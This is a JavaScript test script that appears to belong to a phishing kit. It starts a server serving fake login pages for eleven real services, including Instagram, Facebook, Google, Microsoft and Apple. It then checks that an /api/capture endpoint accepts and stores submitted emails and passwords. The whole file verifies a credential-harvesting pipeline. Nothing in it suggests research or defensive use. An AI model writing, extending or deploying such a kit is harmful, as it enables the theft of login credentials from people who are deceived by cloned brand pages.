import { createServer } from '../lib/server.js';
import { captureStore } from '../lib/capture.js';
import chalk from 'chalk';

async function testService(service) {
  const initialCount = captureStore.count();
  const { server, port, url } = await createServer(service);

  // Test: GET login page
  const pageResp = await fetch(url);
  const html = await pageResp.text();
  if (!html.includes('<input')) {
    console.log(chalk.red(`  ✗ ${service}: page has no input fields`));
    server.close();
    return false;
  }
  console.log(chalk.gray(`  ✓ ${service}: page served (${(html.length/1024).toFixed(0)}KB, ${(html.match(/<input/g)||[]).length} inputs)`));

  // Test: POST capture endpoint
  const capResp = await fetch(`${url}/api/capture`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ service, email: 'test@test.com', password: 'testpass123' }),
  });
  const capData = await capResp.json();
  if (!capData.status) {
    console.log(chalk.red(`  ✗ ${service}: capture endpoint failed`));
    server.close();
    return false;
  }
  console.log(chalk.gray(`  ✓ ${service}: capture endpoint → ${capData.status}`));

  // Test: capture was stored
  if (captureStore.count() <= initialCount) {
    console.log(chalk.red(`  ✗ ${service}: capture not stored`));
    server.close();
    return false;
  }
  console.log(chalk.gray(`  ✓ ${service}: capture stored (total: ${captureStore.count()})`));

  // Test: /api/status endpoint
  const statusResp = await fetch(`${url}/api/status`);
  const statusData = await statusResp.json();
  if (statusData.service !== service) {
    console.log(chalk.red(`  ✗ ${service}: status endpoint wrong service`));
    server.close();
    return false;
  }
  console.log(chalk.gray(`  ✓ ${service}: status endpoint OK`));

  server.close();
  return true;
}

const SERVICES = ['instagram', 'facebook', 'twitter', 'linkedin', 'github', 'microsoft', 'netflix', 'google', 'tiktok', 'snapchat', 'apple'];

async function main() {
  console.log(chalk.white('\n=== Capture Pipeline Test ===\n'));
  let passed = 0, failed = 0;
  for (const svc of SERVICES) {
    process.stdout.write(`  ${chalk.cyan(svc.padEnd(15))} `);
    try {
      const ok = await testService(svc);
      if (ok) passed++; else failed++;
    } catch (err) {
      console.log(chalk.red(`✗ ${err.message}`));
      failed++;
    }
  }
  console.log(chalk.white(`\n=== Results: ${passed} passed, ${failed} failed ===\n`));
  process.exit(failed > 0 ? 1 : 0);
}

main();
